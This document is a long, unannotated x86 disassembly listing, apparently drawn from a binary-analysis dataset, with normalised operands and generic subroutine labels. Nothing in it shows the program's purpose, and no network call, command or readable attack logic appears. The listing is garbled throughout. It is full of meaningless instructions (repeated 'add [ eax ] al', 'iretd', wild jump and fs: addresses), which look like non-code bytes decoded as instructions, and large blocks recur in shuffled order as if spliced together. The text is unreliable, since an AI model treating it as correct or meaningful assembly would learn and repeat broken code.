mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_4033a4
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1423f
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_403354
pop ecx
pop edx
ja r-xdata
pop eax
pop ecx
jns r-xdata
mov esi 0x790cc483
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
add eax 0x4c4835a
jae r-xdata
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
ja r-xdata
add edi 0xff74830f
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1423f
jl 0xffffffffc1c16681
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add [ eax ] al
add [ edi ] cl
pop ecx
pop eax
ja r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jae r-xdata
jo 0x58662877
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
iretd
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
xchg [ edi ] cl
push esp
push eax
call sub_4033a4
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133c1fe
add [ eax ] al
jno 0xf9a8d51
sub_40335d
add esp 0xc
jns r-xdata
pop eax
pop ecx
sub eax 0xbb830f
add [ eax ] al
jns 0x119ba7e
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd42e7
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b8af
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jge r-xdata
jns r-xdata
xor esi 0xac810f59
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_4033a4
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1423f
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_4033a4
pop edx
add esp 0x4
jne r-xdata
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
xor edi 0xaae85157
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_4033a4
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b8af
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1423f
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
jo 0xffffffff894f8d65
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_4033bd
jae r-xdata
jne r-xdata
sub ecx 0xe89c579c
jb r-xdata
jne r-xdata
sub edi 0x4c4835a
jne r-xdata
pop edx
pop ecx
pop eax
jae r-xdata
mov ecx 0xf6811c75
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
xor edi 0xaae85157
jg r-xdata
add esi 0x808f0f5a
add [ eax ] al
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd42e7
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
jg r-xdata
jno 0xf9a8d51
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push edi
push ecx
call sub_40335d
add edx 0xff05e852
jne 0xffffffffc2c16161
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
push ebp
pushfd
push eax
pushfd
add ebx 0xdc7f585a
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_4033a4
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b8af
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1423f
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
jo 0xffffffff894f8d65
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_403478
sub esp 0x14
push ebp
push edi
push esp
sub esp 0x8
call sub_403523
jns 0xffffffff9cc143e5
add [ eax ] al
add [ 0xffffffff850f595a ] cl
jns r-xdata
jmp 0x1001d03
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
push eax
push ecx
sub esp 0x10
call sub_40351f
jo 0xffffffffff29c2e0
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59754211
jae r-xdata
or eax 0x15ff2875
push esi
call sub_40356e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c344da
jns r-xdata
add ebx 0x9c575756
jae r-xdata
or eax 0x8d0fb671
jne r-xdata
call 0xffffffffcec17767
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85bb449
jae r-xdata
jl 0xffffffffa1a4c783
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_40353d
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14457
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e8aa
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
pop ecx
add eax 0xfefc8d0f
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1d28e
jg r-xdata
jge 0x18abaf8
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jno r-xdata
xor eax 0xff56850f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jg r-xdata
jge 0xffffffffc009ab0e
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jg r-xdata
jl 0xe24a8c7
add esp 0x4
ja r-xdata
jge 0x100b996
jns r-xdata
add esi 0x99870f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f83c
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jo 0xc647a5c
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jge r-xdata
call sub_403530
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14def
jae r-xdata
jpo 0x36288e35
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288e85
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
or eax 0x850f595a
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba9da
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13be65
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_40351f
jge r-xdata
add esp 0x8
jge 0xffffffff874fe79c
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jg r-xdata
jge r-xdata
js 0x59754211
jae r-xdata
or eax 0x15ff2875
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c344da
jns r-xdata
add ebx 0x9c575756
jae r-xdata
jo 0xc647a5c
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
call 0xffffffffcec17767
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85bb449
jae r-xdata
jl 0xffffffffa1a4c783
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
jae r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jge r-xdata
call sub_403530
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
push es
jno r-xdata
mov esp 0xd2775a59
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_40353d
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14457
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e8aa
push esi
call sub_40356e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jg r-xdata
jge 0x18abaf8
sub esp 0x1c
jge r-xdata
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1001d03
push eax
push ecx
sub esp 0x10
call sub_40351f
jo 0xffffffffff29c2e0
or esi 0xf04c483
xor ebp 0xfffffffe
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pop ecx
add eax 0xfefc8d0f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jae r-xdata
or eax 0x8d0fb671
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1d28e
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
add esp 0x4
ja r-xdata
jge 0x100b996
jns r-xdata
add esi 0x99870f
jno r-xdata
xor eax 0xff56850f
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f83c
jg r-xdata
jge 0xffffffffc009ab0e
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xe24a8c7
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14def
jae r-xdata
jpo 0x36288e35
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288e85
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba9da
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13be65
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_403523
jne r-xdata
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e8aa
pop ecx
pop edx
ja r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jne r-xdata
ja 0xffffffffe85bb449
jge r-xdata
sub edx 0xf281e771
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1d28e
jns r-xdata
add ebx 0x9c575756
call sub_40353d
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14457
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c344da
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jno r-xdata
xor eax 0xff56850f
push esi
call sub_40356e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jne r-xdata
jl 0xffffffffa1a4c783
jg r-xdata
jge 0x18abaf8
pop ecx
add eax 0xfefc8d0f
jg r-xdata
jge 0xffffffffc009ab0e
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1001d03
push eax
push ecx
sub esp 0x10
call sub_40351f
jo 0xffffffffff29c2e0
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59754211
jae r-xdata
or eax 0x15ff2875
pop ecx
jae r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jg r-xdata
jl 0xe24a8c7
jae r-xdata
or eax 0x8d0fb671
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
call 0xffffffffcec17767
jno r-xdata
add ecx 0x8d0f3a7d
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100b996
jns r-xdata
add esi 0x99870f
jae r-xdata
jo 0xc647a5c
jne r-xdata
xor edi 0x5c775a59
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f83c
jge r-xdata
call sub_403530
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jae r-xdata
or esi 0x937f5959
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
